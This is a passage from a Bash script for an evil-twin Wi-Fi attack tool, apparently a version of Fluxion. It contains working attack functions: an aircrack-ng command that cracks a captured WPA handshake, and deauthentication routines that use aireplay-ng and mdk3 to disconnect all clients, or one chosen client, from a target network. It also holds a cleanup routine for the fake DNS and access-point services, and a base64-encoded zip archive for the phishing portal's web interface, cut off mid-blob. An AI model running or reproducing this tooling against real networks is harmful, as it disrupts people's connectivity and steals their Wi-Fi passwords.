		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"
		">>$DUMP_PATH/handcheck

	elif [ $authmode = "wpa_supplicant" ]; then
		echo "echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
	fi

	echo "kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &>$flux_output_device">>$DUMP_PATH/handcheck
	chmod +x $DUMP_PATH/handcheck
}


############################################# < ATTACK > ############################################






############################################## < STUFF > ############################################

# Deauth all
function deauthall {

	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
}

function deauthmdk3 {

	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
	mdk3PID=$!
}

# Deauth to a specific target
function deauthesp {

	sleep 2
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
}

# Close all processes
function matartodo {

	killall aireplay-ng &>$flux_output_device
	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
	killall hostapd &>$flux_output_device
	killall lighttpd &>$flux_output_device
	killall dhcpd &>$flux_output_device
	killall xterm &>$flux_output_device

}



############################################## < STUFF > ############################################






######################################### < INTERFACE WEB > ########################################

# Create the contents for the web interface
function NEUTRA {

	if [ ! -d $DUMP_PATH/data ]; then
		mkdir $DUMP_PATH/data
	fi

echo "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
